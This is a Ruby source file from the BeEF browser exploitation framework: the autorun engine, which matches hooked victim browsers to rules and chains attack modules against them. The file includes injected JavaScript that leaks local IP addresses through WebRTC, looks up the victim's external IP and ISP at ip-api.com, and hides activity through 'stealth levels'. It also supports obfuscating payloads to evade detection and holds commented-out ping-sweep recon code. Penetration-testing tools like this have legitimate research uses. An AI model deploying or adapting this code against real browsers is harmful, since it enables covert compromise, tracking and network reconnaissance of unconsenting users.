#
# Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Core
    module AutorunEngine

      class Engine

        include Singleton

        def initialize
          @config = BeEF::Core::Configuration.instance

          @result_poll_interval = @config.get('beef.autorun.result_poll_interval')
          @result_poll_timeout = @config.get('beef.autorun.result_poll_timeout')
          @continue_after_timeout = @config.get('beef.autorun.continue_after_timeout')

          @debug_on = @config.get('beef.debug')

          @VERSION = ['<','<=','==','>=','>','ALL']
          @VERSION_STR = ['XP','Vista']
        end

        # Check if the hooked browser type/version and OS type/version match any Rule-sets
        # stored in the BeEF::Core::AutorunEngine::Models::Rule database table
        # If one or more Rule-sets do match, trigger the module chain specified
        def run(hb_id, browser_name, browser_version, os_name, os_version)
          are = BeEF::Core::AutorunEngine::Engine.instance
          match_rules = are.match(browser_name, browser_version, os_name, os_version)
          are.trigger(match_rules, hb_id) if match_rules !=nil && match_rules.length > 0
        end

        # Prepare and return the JavaScript of the modules to be sent.
        # It also updates the rules ARE execution table with timings
        def trigger(rule_ids, hb_id)

          hb = BeEF::HBManager.get_by_id(hb_id)
          hb_session = hb.session

          rule_ids.each do |rule_id|
            rule = BeEF::Core::AutorunEngine::Models::Rule.get(rule_id)
            modules = JSON.parse(rule.modules)

            execution_order = JSON.parse(rule.execution_order)
            execution_delay = JSON.parse(rule.execution_delay)
            chain_mode  = rule.chain_mode
            stealth_mode = rule.stealth_mode

            mods_bodies = Array.new
            mods_codes = Array.new
            mods_conditions = Array.new

            # this ensures that if both rule A and rule B call the same module in sequential mode,
            # execution will be correct preventing wrapper functions to be called with equal names.
            rule_token = SecureRandom.hex(5)

            modules.each do |cmd_mod|
              mod = BeEF::Core::Models::CommandModule.first(:name => cmd_mod['name'])
              options = []
              replace_input = false
              cmd_mod['options'].each do|k,v|
                options.push({'name' => k, 'value' => v})
                replace_input = true if v == '<<mod_input>>'
              end

              command_body = prepare_command(mod, options, hb_id, replace_input, rule_token)


              mods_bodies.push(command_body)
              mods_codes.push(cmd_mod['code'])
              mods_conditions.push(cmd_mod['condition'])
            end

            # Depending on the chosen chain mode (sequential or nested/forward), prepare the appropriate wrapper
            case chain_mode
              when 'nested-forward'
                wrapper = prepare_nested_forward_wrapper(mods_bodies, mods_codes, mods_conditions, execution_order, rule_token)
              when 'sequential'
                wrapper = prepare_sequential_wrapper(mods_bodies, execution_order, execution_delay, rule_token)
              when 'dormant-forward'
                wrapper = prepare_dormant_forward_wrapper(mods_bodies, mods_codes, mods_conditions, execution_order, rule_token, stealth_mode)
              else
                wrapper = nil
                print_error "Chain mode looks wrong!"
                # TODO catch error, which should never happen as values are checked way before ;-)
            end

            are_exec = BeEF::Core::AutorunEngine::Models::Execution.new(
                :session => hb_session,
                :mod_count => modules.length,
                :mod_successful => 0,
                :rule_token => rule_token,
                :mod_body => wrapper,
                :is_sent => false,
                :rule_id => rule_id
            )
            are_exec.save
            # Once Engine.check() verified that the hooked browser match a Rule, trigger the Rule ;-)
            print_more "Triggering ruleset #{rule_ids.to_s} on HB #{hb_id}"
          end
        end


        def prepare_dormant_forward_wrapper(mods, code, conditions, order, rule_token, stealth_mode)
          wrapper = ''
          delayed_exec = ''
          delayed_exec_footers = Array.new
          c = 0

          while c < mods.length
            if mods.length == 1
              i = c
            else
              i = c + 1
            end

            code_snippet = ''
            mod_input = ''
            if code[c] != 'null' && code[c] != ''
              code_snippet = code[c]
              mod_input = 'mod_input'
            end

            conditions[i] = true if conditions[i] == nil || conditions[i] == ''

            if c == 0
              # this is the first wrapper to prepare
              delayed_exec += %Q|
                
                var verbLogEnabled = true;
                var saveLocal = false;
                var onlineStatus = false;
                var rtcIps = "";
                var externalIp = "";
                var isp = "";
                var pollTimeout = 20000;
                var netcount = 0;
                var ts = null;
                // stealthLevel
                // 1 - not too stealthy, when we see a new network we will:
                //   - * immediately probe for external stuff
                //   - * immediately send data back to beef (or try)
                // 2 - sort of stealthy, when we see a new network we will:
                //   - * immediately probe for external stuff
                //   - * NOT send back to beef until we return to original network
                // 3 - very stealthy, when we see a new network we will:
                //   - * NOT probe for external information
                //   - * NOT send back to beef until we return to original network
                var stealthLevel = #{stealth_mode};

                // globals
                agTimer = null;
                agOnlineIntervalTimer = null;

                function verbLog(msg) {
                  if (verbLogEnabled === true) {
                    var p = document.createElement("p");
                    p.innerHTML = msg;
                    document.body.insertBefore(p, document.body.firstChild);
                    console.log(msg);
                  }
                }

                function printStatus(sendtobeef) {
                  var sendtobeef = typeof sendtobeef !== 'undefined' ? sendtobeef : false;

                  verbLog("Online Status: '" + onlineStatus + "'");
                  verbLog("RTC IPs: '" + rtcIps+ "'");
                  verbLog("External IP: '" + externalIp + "'");
                  verbLog("ISP: '" + isp + "'");

                  if (sendtobeef == true) {
                    verbLog("FIX THIS")
                    //beef.net.send('<%= @command_url %>', <%= @command_id %>,
                    //              "OnlineStatus="+onlineStatus+"&RtcIps="+rtcIps+
                    //              "&ExternalIp="+externalIp+"&isp="+isp);
                  }
                }

                function getOnlineState() {
                  // https://developer.mozilla.org/en-US/docs/Web/API/NavigatorOnLine/onLine
                  return window.navigator.onLine;
                }

                // This is yanked from the WebRTC IP Module
                function getRtcIp(success, failure) {
                  var RTCPeerConnection = false;
                  if (window.webkitRTCPeerConnection) {
                    RTCPeerConnection = window.webkitRTCPeerConnection;
                  } else if (window.mozRTCPeerConnection) {
                    RTCPeerConnection = window.mozRTCPeerConnection;
                  }
              
                  if (RTCPeerConnection){
              
                      var addrs = Object.create(null);
                      addrs["0.0.0.0"] = false;
              
                      // Construct RTC peer connection
                      var servers = {iceServers:[]};
                      var mediaConstraints = {optional:[{googIPv6: true}]};
                      var rtc = new RTCPeerConnection(servers, mediaConstraints);
                      rtc.createDataChannel('', {reliable:false});
              
                      // Upon an ICE candidate being found
                      // Grep the SDP data for IP address data
                      rtc.onicecandidate = function (evt) {
                        if (evt.candidate){
                          grepSDP("a="+evt.candidate.candidate);
                        }
                      };
              
                      // Create an SDP offer
                      rtc.createOffer(function (offerDesc) {
                          grepSDP(offerDesc.sdp);
                          rtc.setLocalDescription(offerDesc);
                      }, function (e) {
                        // failed SDP offer - do nothing
                        failure("failed SDP offer");
                      });
              
                      // Return results
                      function processIPs(newAddr) {
                          // check here for only ipv4 // HACK
                          if (newAddr.length > 15) {
                              return;
                          }
                          if (newAddr in addrs) return;
                          else addrs[newAddr] = true;
                          var displayAddrs = Object.keys(addrs).filter(function (k) {
                              return addrs[k];
                          });
                          success(displayAddrs.join(","));
                      }
              
              
                      // Retrieve IP addresses from SDP 
                      function grepSDP(sdp) {
                          var hosts = [];
                          // c.f. http://tools.ietf.org/html/rfc4566#page-39
                          sdp.split('\\r\\n').forEach(function (line) {
                              // http://tools.ietf.org/html/rfc4566#section-5.13
                              if (~line.indexOf("a=candidate")) {
                                  // http://tools.ietf.org/html/rfc5245#section-15.1
                                  var parts = line.split(' '),
                                      addr = parts[4],
                                      type = parts[7];
                                  if (type === 'host') processIPs(addr);
                                         // http://tools.ietf.org/html/rfc4566#section-5.7
                              } else if (~line.indexOf("c=")) {
                                  var parts = line.split(' '),
                                      addr = parts[2];
                                  processIPs(addr);
                              }
                          });
                      }
                  }else {
                    failure("Doesnt support RTC");
                  }
              
                }
              
                // This function reaches out to <site> to get info
                // TODO: This should have 'failure' async method handling too
                function getExternalDetails(completion) {
                  var xhttp3 = new XMLHttpRequest();
                  xhttp3.onreadystatechange = function() {
                      if (xhttp3.readyState == 4 && xhttp3.status == 200) {
                          completion(xhttp3.responseText);
                      }
                  };
                  xhttp3.open("GET", "http://ip-api.com/json?rnd="+Date.now(), true);
                  xhttp3.send(); 
                }
              
                // This doesn't seem to work .. 
                // But it does work on FF?
                $j(document).on('online offline',function(e) {
                  verbLog("gone "+e.type);
                });
              
                // Check if we can use localStorage
                function storageAvailable(type) {
                  try {
                    var storage = window[type], x = '__storage_test__';
                      storage.setItem(x, x);
                      storage.removeItem(x);
                      return true;
                    }
                    catch(e) {
                      return false;
                    }
                }
              
                // Save state .. into localStorage if available
                // TODO: This should maybe save a json/data struct into some B64 encoded blob?
                function saveState(saveLocal, id, online, rtc, ip, isp) {
                  if (saveLocal == true) {
                    localStorage.setItem('rtc_'+id, rtc);
                    onlineStatus = online;
                    localStorage.setItem('ip_'+id, ip);
                    localStorage.setItem('isp_'+id, isp);
                    localStorage.setItem('ts_'+id, Date.now());
                  } // else ? what then?
                }
              
                // This tries to figure out where we are
                // In all instances, at the end, it should re-kick off the timers
                function presenceCheck() {
                  // how long have I been away for?
                  var prevStamp = ts;
                  verbLog("prev: " + Math.round(prevStamp/1000));
                  verbLog("Now: " + Math.round(Date.now()/1000));
              
                  if ((Math.round(prevStamp/1000)+60) < (Math.round(Date.now()/1000))) {
                    // it's been longer than a minute!
                    verbLog("It's been longer than a minute - what's happened?");
                  
                    startTimers();
                  } else {
                    // it's been less than a minute
                    verbLog("It's been less than a minute - what's happened?");
                    // do we want to double-check RTC? For instance, if we've gone from
                    // GSM to WiFi?
              
                    // check changes to online status
                    var freshOnlineStatus = getOnlineState();
                    if ((freshOnlineStatus.toString().toUpperCase()) === 
                            onlineStatus.toString().toUpperCase()) {
                      // we havent' changed status - apparently?
                      verbLog("we haven't changed online status");
              
                      startTimers();
                    } else {
                      // we are now in a different online state.
                      verbLog("we are now in a different state. freshOnlineStatus:");
                      verbLog("'" + freshOnlineStatus.toString() + "'");
              
                      if ((freshOnlineStatus.toString().toUpperCase()) === "FALSE") {
                        // we are now offline from being online
                        verbLog("we are now offline ... ");
                        onlineStatus = freshOnlineStatus;
              
                        startTimers();
                      } else {
                        // we are now online from offline
                        verbLog("we are back online!..");
                        verbLog("do checks here..");
              
                        getRtcIp(function(e) {
                          if (checkPreviousRtc(e)) {
                            // rtc hasn't changed
                            verbLog("rtc hasn't changed");
                            onlineStatus = freshOnlineStatus;
                
                            startTimers();
                          } else {
                            // check how different the IP is
                            verbLog("We were: " + localStorage.getItem('rtc_'+netcount));
                            verbLog("We are now: " + e);
                            onlineStatus = freshOnlineStatus;
                            // save a new network location object
                            // kick off scan
                            // store results
                            netRecon(e);
                            
                          }
              
                        }, function(e) {
                          //rut roh - couldn't get RtcIp?
                          verbLog("How?");
                        });
                      }
                    }
                  }
                }
              
                function checkPreviousRtc(ip) {
                  var result = false;
                  if (saveLocal === true) {
                    for (var c = 0; c <= netcount; c++) {
                      if (ip.toUpperCase() === localStorage.getItem('rtc_'+c).toUpperCase()) {
                        result = true;
                      }
                    }
                  }
              
                  return result;
                }
                function checkOnlineState() {
                  var newState = getOnlineState();
                  if (onlineStatus !== newState) {
                    clearInterval(agOnlineIntervalTimer); // clear the interval 
                    clearTimeout(agTimer); // clear the timeout

                    verbLog("online status changed!");

                    presenceCheck();
                  }
                }

                function startTimers() {
                  ts = Date.now();
                  agTimer = setTimeout(function() {presenceCheck()}, pollTimeout);
                  clearInterval(agOnlineIntervalTimer);
                  agOnlineIntervalTimer = setInterval(function() {checkOnlineState()},
                                                         200);
                }

                function netRecon(rtcresult) {
                  verbLog("PERFORM NETWORK RECON HERE!");
                  getExternalDetails(function(e) {
                    externalIp = JSON.parse(e).query;
                    rtcIps = rtcresult;
                    isp = JSON.parse(e).isp;

                    netcount++;

                    if (stealthLevel === 1) {
                      printStatus(true);
                    } else {
                      printStatus(false);
                    }

                    saveState(saveLocal, netcount, onlineStatus, rtcresult, externalIp, isp);

                    //var s=rtcIps.split('.');
                    //var start = s[0]+'.'+s[1]+'.'+s[2]+'.65';
                    //var end = s[0]+'.'+s[1]+'.'+s[2]+'.70';
                    //var mod_input = start+'-'+end;

                    //ping_sweep(mod_input,4,get_http_servers);
                    outer_sequential_mod_output = rtcIps;
                    outer_sequential();


                    // startTimers();
                  });
                }

                function setupPhase() {
                  //redundant as we know?
                  if (storageAvailable('localStorage') == true) {
                    saveLocal = true;
                    // clear the current localStorage?
                    localStorage.clear();
                  }

                  onlineStatus = getOnlineState();

                  getRtcIp(function(e) {
                    rtcIps = e;
                    getExternalDetails(function(e) {
                      externalIp = JSON.parse(e).query;
                      isp = JSON.parse(e).isp;

                      printStatus(true);

                      saveState(saveLocal, netcount, onlineStatus, rtcIps, externalIp, isp);

                      if (stealthLevel > 1) {
                        // turn off beef polling
                        beef.updater.lock = true;
                      }
                      startTimers();

                      


                    });
                  }, function(e) {
                    //console.log("failure " + e);
                  });
                }

                function outer_sequential(){
                  verbLog("Starting outer sequential");
                  function #{mods[order[c]][:mod_name]}_#{rule_token}_f(){
                    verbLog("Running the inner function now");
                    //CODE
                    //var s=mod_input.split('.');
                    //var start = s[0]+'.'+s[1]+'.0.67';
                    //var end = s[0]+'.'+s[1]+'.0.71';
                    //var mod_input = start+'-'+end;
                    #{code_snippet}
                    verbLog("Running the mod with the following input: '" + mod_input);
                    #{mods[order[c]][:mod_name]}_#{rule_token}(mod_input);

                    if (stealthLevel > 1) {
                      // manually pop beef modules because we killed the timer
                      while(beef.commands.length > 0) {
                        verbLog("command POP");
                        command = beef.commands.pop();
                        try {
                          command();
                        } catch(e) {
                          beef.debug('dormant - failed to execute ' + e.message);
                          beef.debug(command.toString());
                        }
                      }
                    }
                  }


              |

              delayed_exec_footer = %Q|

                    #{mods[order[c]][:mod_name]}_#{rule_token}_f();
                  }

                  verbLog("about to start..");

                  setupPhase();
              |
              delayed_exec_footers.push(delayed_exec_footer)
            end
            mod_body = mods[order[c]][:mod_body].to_s.gsub("#{mods[order[c]][:mod_name]}_mod_output", "#{mods[order[c]][:mod_name]}_#{rule_token}_mod_output")
            wrapped_mod = "#{mod_body}\n"
            wrapper += wrapped_mod
            c += 1
          end
          
          wrapper += delayed_exec + delayed_exec_footers.reverse.join("\n")
          print_more "Final Modules Wrapper:\n #{delayed_exec + delayed_exec_footers.reverse.join("\n")}" if @debug_on
          wrapper

        end

        # Wraps module bodies in their own function, using setTimeout to trigger them with an eventual delay.
        # Launch order is also taken care of.
        #  - sequential chain with delays (setTimeout stuff)
        #    ex.: setTimeout(module_one(),   0);
        #         setTimeout(module_two(),   2000);
        #         setTimeout(module_three(), 3000);
        # Note: no result status is checked here!! Useful if you just want to launch a bunch of modules without caring
        #  what their status will be (for instance, a bunch of XSRFs on a set of targets)
        def prepare_sequential_wrapper(mods, order, delay, rule_token)
          wrapper = ''
          delayed_exec = ''
          c = 0
          while c < mods.length
            delayed_exec += %Q| setTimeout(function(){#{mods[order[c]][:mod_name]}_#{rule_token}();}, #{delay[c]}); |
            mod_body = mods[order[c]][:mod_body].to_s.gsub("#{mods[order[c]][:mod_name]}_mod_output", "#{mods[order[c]][:mod_name]}_#{rule_token}_mod_output")
            wrapped_mod = "#{mod_body}\n"
            wrapper += wrapped_mod
            c += 1
          end
          wrapper += delayed_exec
          print_more "Final Modules Wrapper:\n #{wrapper}" if @debug_on
          wrapper
        end

        # Wraps module bodies in their own function, then start to execute them from the first, polling for
        # command execution status/results (with configurable polling interval and timeout).
        # Launch order is also taken care of.
        #  - nested forward chain with status checks (setInterval to wait for command to return from async operations)
        #    ex.:  module_one()
        #           if condition
        #             module_two(module_one_output)
        #               if condition
        #                  module_three(module_two_output)
        #
        # Note: command result status is checked, and you can properly chain input into output, having also
        # the flexibility of slightly mangling it to adapt to module needs.
        # Note: Useful in situations where you want to launch 2 modules, where the second one will execute only
        #     if the first once return with success. Also, the second module has the possibility of mangling first
        #     module output and use it as input for some of its module inputs.
        def prepare_nested_forward_wrapper(mods, code, conditions, order, rule_token)
          wrapper, delayed_exec = '',''
          delayed_exec_footers = Array.new
          c = 0

          while c < mods.length
            if mods.length == 1
              i = c
            else
              i = c + 1
            end

            code_snippet = ''
            mod_input = ''
            if code[c] != 'null' && code[c] != ''
              code_snippet = code[c]
              mod_input = 'mod_input'
            end

            conditions[i] = true if conditions[i] == nil || conditions[i] == ''

            if c == 0
              # this is the first wrapper to prepare
              delayed_exec += %Q|
                function #{mods[order[c]][:mod_name]}_#{rule_token}_f(){
                  #{mods[order[c]][:mod_name]}_#{rule_token}();

                  // TODO add timeout to prevent infinite loops
                  function isResReady(mod_result, start){
                    if (mod_result === null && parseInt(((new Date().getTime()) - start)) < #{@result_poll_timeout}){
                       // loop
                    }else{
                       // module return status/data is now available
                       clearInterval(resultReady);
                          if (mod_result === null && #{@continue_after_timeout}){
                              var mod_result = [];
                              mod_result[0] = 1; //unknown status
                              mod_result[1] = '' //empty result
                          }
                          var status = mod_result[0];
                       if(#{conditions[i]}){
                         #{mods[order[i]][:mod_name]}_#{rule_token}_can_exec = true;
                         #{mods[order[c]][:mod_name]}_#{rule_token}_mod_output = mod_result[1];
              |

              delayed_exec_footer = %Q|
                     }
                    }
                  }
                  var start = (new Date()).getTime();
                  var resultReady = setInterval(function(){var start = (new Date()).getTime(); isResReady(#{mods[order[c]][:mod_name]}_#{rule_token}_mod_output, start);},#{@result_poll_interval});
                }
                #{mods[order[c]][:mod_name]}_#{rule_token}_f();
              |

              delayed_exec_footers.push(delayed_exec_footer)

            elsif c < mods.length - 1
              code_snippet = code_snippet.to_s.gsub(mods[order[c-1]][:mod_name], "#{mods[order[c-1]][:mod_name]}_#{rule_token}")

              # this is one of the wrappers in the middle of the chain
              delayed_exec += %Q|
                function #{mods[order[c]][:mod_name]}_#{rule_token}_f(){
                  if(#{mods[order[c]][:mod_name]}_#{rule_token}_can_exec){
                     #{code_snippet}
                     #{mods[order[c]][:mod_name]}_#{rule_token}(#{mod_input});
                     function isResReady(mod_result, start){
                        if (mod_result === null && parseInt(((new Date().getTime()) - start)) < #{@result_poll_timeout}){
                           // loop
                        }else{
                           // module return status/data is now available
                         clearInterval(resultReady);
                          if (mod_result === null && #{@continue_after_timeout}){
                              var mod_result = [];
                              mod_result[0] = 1; //unknown status
                              mod_result[1] = '' //empty result
                          }
                          var status = mod_result[0];
                          if(#{conditions[i]}){
                             #{mods[order[i]][:mod_name]}_#{rule_token}_can_exec = true;
                             #{mods[order[c]][:mod_name]}_#{rule_token}_mod_output = mod_result[1];
              |

              delayed_exec_footer = %Q|
                         }
                       }
                     }
                     var start = (new Date()).getTime();
                     var resultReady = setInterval(function(){ isResReady(#{mods[order[c]][:mod_name]}_#{rule_token}_mod_output, start);},#{@result_poll_interval});
                  }
                }
                #{mods[order[c]][:mod_name]}_#{rule_token}_f();
              |

              delayed_exec_footers.push(delayed_exec_footer)
            else
              code_snippet = code_snippet.to_s.gsub(mods[order[c-1]][:mod_name], "#{mods[order[c-1]][:mod_name]}_#{rule_token}")
              # this is the last wrapper to prepare
              delayed_exec += %Q|
                function #{mods[order[c]][:mod_name]}_#{rule_token}_f(){
                  if(#{mods[order[c]][:mod_name]}_#{rule_token}_can_exec){
                     #{code_snippet}
                     #{mods[order[c]][:mod_name]}_#{rule_token}(#{mod_input});
                  }
                }
                #{mods[order[c]][:mod_name]}_#{rule_token}_f();
              |
            end
            mod_body = mods[order[c]][:mod_body].to_s.gsub("#{mods[order[c]][:mod_name]}_mod_output", "#{mods[order[c]][:mod_name]}_#{rule_token}_mod_output")
            wrapped_mod = "#{mod_body}\n"
            wrapper += wrapped_mod
            c += 1
          end
          wrapper += delayed_exec + delayed_exec_footers.reverse.join("\n")
          print_more "Final Modules Wrapper:\n #{delayed_exec + delayed_exec_footers.reverse.join("\n")}" if @debug_on
          wrapper
        end


        # prepare the command module (compiling the Erubis templating stuff), eventually obfuscate it,
        # and store it in the database.
        # Returns the raw module body after template substitution.
        def prepare_command(mod, options, hb_id, replace_input, rule_token)
          config = BeEF::Core::Configuration.instance
          begin
            command = BeEF::Core::Models::Command.new(
                :data => options.to_json,
                :hooked_browser_id => hb_id,
                :command_module_id => BeEF::Core::Configuration.instance.get("beef.module.#{mod.name}.db.id"),
                :creationdate => Time.new.to_i,
                :instructions_sent => true
            )
            command.save

            command_module = BeEF::Core::Models::CommandModule.first(:id => mod.id)
            if (command_module.path.match(/^Dynamic/))
              # metasploit and similar integrations
              command_module = BeEF::Modules::Commands.const_get(command_module.path.split('/').last.capitalize).new
            else
              # normal modules always here
              key = BeEF::Module.get_key_by_database_id(mod.id)
              command_module = BeEF::Core::Command.const_get(config.get("beef.module.#{key}.class")).new(key)
            end

            hb = BeEF::HBManager.get_by_id(hb_id)
            hb_session = hb.session
            command_module.command_id = command.id
            command_module.session_id = hb_session
            command_module.build_datastore(command.data)
            command_module.pre_send

            build_missing_beefjs_components(command_module.beefjs_components) unless command_module.beefjs_components.empty?

            if config.get("beef.extension.evasion.enable")
              evasion = BeEF::Extension::Evasion::Evasion.instance
              command_body = evasion.obfuscate(command_module.output) + "\n\n"
            else
              command_body = command_module.output  + "\n\n"
            end

            # @note prints the event to the console
            print_more "Preparing JS for command id [#{command.id}], module [#{mod.name}]"

            replace_input ? mod_input = 'mod_input' : mod_input = ''
            result = %Q|
                var #{mod.name}_#{rule_token} = function(#{mod_input}){
                    #{clean_command_body(command_body, replace_input)}
                };
                var #{mod.name}_#{rule_token}_can_exec = false;
                var #{mod.name}_#{rule_token}_mod_output = null;
            |

            return {:mod_name => mod.name, :mod_body => result}
          rescue =>  e
            print_error e.message
            print_debug e.backtrace.join("\n")
          end
        end

        # Removes the beef.execute wrapper in order that modules are executed in the ARE wrapper, rather than
        # using the default behavior of adding the module to an array and execute it at polling time.
        #
        # Also replace <<mod_input>> with mod_input variable if needed for chaining module output/input
        def clean_command_body(command_body, replace_input)
          begin
            cmd_body = command_body.lines.map(&:chomp)
            wrapper_start_index,wrapper_end_index = nil

            cmd_body.each_with_index do |line, index|
              if line.to_s =~ /^(beef|[a-zA-Z]+)\.execute\(function\(\)/
                wrapper_start_index = index
                break
              end
            end
            if wrapper_start_index.nil?
              print_error "[ARE] Could not find module start index"
            end

            cmd_body.reverse.each_with_index do |line, index|
              if line.include?('});')
                wrapper_end_index = index
                break
              end
            end
            if wrapper_end_index.nil?
              print_error "[ARE] Could not find module end index"
            end

            cleaned_cmd_body = cmd_body.slice(wrapper_start_index..-(wrapper_end_index+1)).join("\n")
            if cleaned_cmd_body.eql?('')
              print_error "[ARE] No command to send"
            end

            # check if <<mod_input>> should be replaced with a variable name (depending if the variable is a string or number)
            if replace_input
              if cleaned_cmd_body.include?('"<<mod_input>>"')
                final_cmd_body = cleaned_cmd_body.gsub('"<<mod_input>>"','mod_input')
              elsif cleaned_cmd_body.include?('\'<<mod_input>>\'')
                final_cmd_body = cleaned_cmd_body.gsub('\'<<mod_input>>\'','mod_input')
              elsif cleaned_cmd_body.include?('<<mod_input>>')
                final_cmd_body = cleaned_cmd_body.gsub('\'<<mod_input>>\'','mod_input')
              else
                return cleaned_cmd_body
              end
              return final_cmd_body
            else
              return cleaned_cmd_body
            end
          rescue =>  e
            print_error "[ARE] There is likely a problem with the module's command.js parsing. Check Engine.clean_command_body"
          end
        end


        # Checks if there are any ARE rules to be triggered for the specified hooked browser
        #
        # Note: browser version checks are supporting only major versions, ex: C 43, IE 11
        # Note: OS version checks are supporting major/minor versions, ex: OSX 10.10, Windows 8.1
        #
        # Returns an array with rule IDs that matched and should be triggered.
        # if rule_id is specified, checks will be executed only against the specified rule (useful
        #  for dynamic triggering of new rulesets ar runtime)
        def match(browser, browser_version, os, os_version, rule_id=nil)
          match_rules = []
          if rule_id != nil
            rules = [BeEF::Core::AutorunEngine::Models::Rule.get(rule_id)]
          else
            rules = BeEF::Core::AutorunEngine::Models::Rule.all()
          end
          return nil if rules == nil
          return nil unless rules.length > 0

          print_info "[ARE] Checking if any defined rules should be triggered on target."
          # TODO handle cases where there are multiple ARE rules for the same hooked browser.
          # TODO the above works well, but maybe rules need to have priority or something?
          rules.each do |rule|
            begin
              browser_match, os_match = false, false

              b_ver_cond = rule.browser_version.split(' ').first
              b_ver = rule.browser_version.split(' ').last

              os_ver_rule_cond = rule.os_version.split(' ').first
              os_ver_rule_maj = rule.os_version.split(' ').last.split('.').first
              os_ver_rule_min = rule.os_version.split(' ').last.split('.').last

              # Most of the times Linux/*BSD OS doesn't return any version
              # (TODO: improve OS detection on these operating systems)
              if os_version != nil && !@VERSION_STR.include?(os_version)
                os_ver_hook_maj = os_version.split('.').first
                os_ver_hook_min = os_version.split('.').last

                # the following assignments to 0 are need for later checks like:
                # 8.1 >= 7, because if the version doesn't have minor versions, maj/min are the same
                os_ver_hook_min = 0 if os_version.split('.').length == 1
                os_ver_rule_min = 0 if rule.os_version.split('.').length == 1
              else
                # most probably Windows XP or Vista. the following is a hack as Microsoft had the brilliant idea
                # to switch from strings to numbers in OS versioning. To prevent rewriting code later on,
                # we say that XP is Windows 5.0 and Vista is Windows 6.0. Easier for comparison later on.
                  os_ver_hook_maj, os_ver_hook_min = 5, 0 if os_version == 'XP'
                  os_ver_hook_maj, os_ver_hook_min = 6, 0 if os_version == 'Vista'
              end

              os_ver_rule_maj, os_ver_rule_min = 5, 0 if os_ver_rule_maj == 'XP'
              os_ver_rule_maj, os_ver_rule_min = 6, 0 if os_ver_rule_maj == 'Vista'

              next unless @VERSION.include?(b_ver_cond)
              next unless BeEF::Filters::is_valid_browserversion?(b_ver)

              next unless @VERSION.include?(os_ver_rule_cond) || @VERSION_STR.include?(os_ver_rule_cond)
              # os_ver without checks as it can be very different or even empty, for instance on linux/bsd)

              # skip rule unless the browser matches
              browser_match = false
              # check if rule specifies multiple browsers
              if rule.browser !~ /\A[A-Z]+\Z/
                rule.browser.gsub(/[^A-Z,]/i, '').split(',').each do |b|
                  browser_match = true if b == browser || b == 'ALL'
                end
              # else, only one browser
              else
                next unless rule.browser == 'ALL' || browser == rule.browser
                # check if the browser version matches
                browser_version_match = compare_versions(browser_version.to_s, b_ver_cond, b_ver.to_s)
                if browser_version_match
                  browser_match = true
                else
                  browser_match = false
                end
                print_more "Browser version check -> (hook) #{browser_version} #{rule.browser_version} (rule) : #{browser_version_match}"
              end
              next unless browser_match

              # skip rule unless the OS matches
              next unless rule.os == 'ALL' || os == rule.os

              # check if the OS versions match
              if os_version != nil || rule.os_version != 'ALL'
                os_major_version_match = compare_versions(os_ver_hook_maj.to_s, os_ver_rule_cond, os_ver_rule_maj.to_s)
                os_minor_version_match = compare_versions(os_ver_hook_min.to_s, os_ver_rule_cond, os_ver_rule_min.to_s)
              else
                # os_version_match = true if (browser doesn't return an OS version || rule OS version is ALL )
                os_major_version_match, os_minor_version_match = true, true
              end

              os_match = true if os_ver_rule_cond == 'ALL' || (os_major_version_match && os_minor_version_match)
              print_more "OS version check -> (hook) #{os_version} #{rule.os_version} (rule): #{os_major_version_match && os_minor_version_match}"

              if browser_match && os_match
                print_more "Hooked browser and OS type/version MATCH rule: #{rule.name}."
                match_rules.push(rule.id)
              end
            rescue =>  e
              print_error e.message
              print_debug e.backtrace.join("\n")
            end
          end
          print_more "Found [#{match_rules.length}/#{rules.length}] ARE rules matching the hooked browser type/version."

          return match_rules
        end

        # compare versions
        def compare_versions(ver_a, cond, ver_b)
          return true if cond == 'ALL'
          return true if cond == '==' && ver_a == ver_b
          return true if cond == '<=' && ver_a <= ver_b
          return true if cond == '<'  && ver_a <  ver_b
          return true if cond == '>=' && ver_a >= ver_b
          return true if cond == '>'  && ver_a >  ver_b
          return false
        end
      end
    end
  end
end
